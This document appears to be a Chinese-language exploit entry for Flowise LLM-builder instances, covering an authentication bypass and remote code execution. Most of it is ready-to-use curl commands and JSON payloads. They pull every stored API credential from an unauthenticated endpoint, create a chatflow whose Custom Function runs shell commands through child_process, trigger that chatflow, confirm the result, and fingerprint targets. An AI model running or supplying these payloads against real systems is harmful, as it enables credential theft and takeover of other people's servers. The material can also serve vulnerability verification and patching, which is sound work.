---
id: FLOWISE-AUTH-BYPASS-RCE
title: Flowise 认证绕过与远程代码执行漏洞
product: flowise
vendor: FlowiseAI
version_affected: "< 1.4.6"
severity: CRITICAL
tags: [rce, auth_bypass, ai, llm, 无需认证]
fingerprint: ["Flowise", "flowise", "/api/v1/chatflows", "/api/v1/predictions"]
---

## 漏洞描述

Flowise是低代码LLM应用构建工具，存在认证绕过(API端点默认无鉴权)和通过自定义代码节点执行任意代码的漏洞。

## 影响版本

- Flowise < 1.4.6（认证绕过）
- Flowise 所有版本（通过 Custom Function 节点执行代码）

## 前置条件

- 目标 Flowise 服务端口（默认3000）可从网络访问
- 认证绕过: 服务启用了认证但 API 端点未正确鉴权
- RCE: 需能创建或修改 chatflow（通过认证绕过即可实现）

## 利用步骤

### 认证绕过 — API端点未鉴权

```bash
# API端点无需认证
curl http://target:3000/api/v1/chatflows
curl http://target:3000/api/v1/credentials
```

### 凭据泄露

```bash
curl http://target:3000/api/v1/credentials
# 返回所有存储的API密钥（OpenAI、数据库密码等）
```

### 通过 Custom Function 执行代码

创建包含恶意代码的chatflow:
```json
{
  "nodes": [{
    "data": {
      "type": "customFunction",
      "inputs": {
        "javascriptFunction": "const {execSync} = require('child_process'); return execSync('id').toString();"
      }
    }
  }]
}
```

## Payload

### 认证绕过 — 读取凭据

```bash
curl -s http://target:3000/api/v1/credentials
```

### 认证绕过 — 列出所有 chatflow

```bash
curl -s http://target:3000/api/v1/chatflows
```

### 创建恶意 chatflow 实现 RCE

```bash
curl -s -X POST http://target:3000/api/v1/chatflows \
  -H "Content-Type: application/json" \
  -d '{
    "name": "rce-test",
    "nodes": [{
      "data": {
        "type": "customFunction",
        "inputs": {
          "javascriptFunction": "const {execSync} = require(\"child_process\"); return execSync(\"id\").toString();"
        }
      }
    }]
  }'
```

### 触发 chatflow 执行

```bash
FLOW_ID="<从chatflows列表获取的id>"
curl -s -X POST http://target:3000/api/v1/predictions/${FLOW_ID} \
  -H "Content-Type: application/json" \
  -d '{"question": "trigger"}'
```

## 验证方法

```bash
# 1. 确认认证绕过：返回 chatflow 列表（非 401/403）即存在漏洞
curl -s -o /dev/null -w "%{http_code}" http://target:3000/api/v1/chatflows
# 200 = 认证绕过

# 2. 确认凭据泄露：返回 API 密钥列表
curl -s http://target:3000/api/v1/credentials | grep '"name"'

# 3. RCE 验证：通过 prediction 触发自定义函数，响应中包含命令输出
curl -s -X POST "http://target:3000/api/v1/predictions/${FLOW_ID}" \
  -H "Content-Type: application/json" \
  -d '{"question":"trigger"}' \
  | grep "uid="
```

## 指纹确认

```bash
curl -s http://target:3000/ | grep -i "flowise"
curl -s http://target:3000/api/v1/
```
